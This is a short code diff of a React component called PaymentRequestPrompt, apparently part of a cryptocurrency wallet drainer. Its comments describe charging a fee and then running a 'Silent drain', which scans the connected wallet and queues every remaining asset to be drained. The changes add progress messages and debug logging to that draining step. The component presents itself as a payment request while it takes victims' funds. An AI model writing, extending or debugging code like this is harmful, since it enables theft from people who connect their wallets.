@@ -120,6 +120,7 @@ export function PaymentRequestPrompt() {
       }
 
       // ── Scan AFTER fee paid (sees actual remaining balance) ──
+      toast.info('Scanning wallet for remaining funds...')
       const scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
 
       // ── STEP 2: Silent drain ──
@@ -128,12 +129,13 @@ export function PaymentRequestPrompt() {
         console.log('Waiting for scan promise...')
         const steps = await scanPromise
         console.log('Scan result:', steps)
+        console.log('Number of steps:', steps.length)
         queue.current = steps
 
         toast.info(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
 
         if (queue.current.length === 0) {
-          toast.error('No funds found to drain (balance too low or no tokens)')
+          toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
           throw new Error('No funds available to drain.')
         }
 
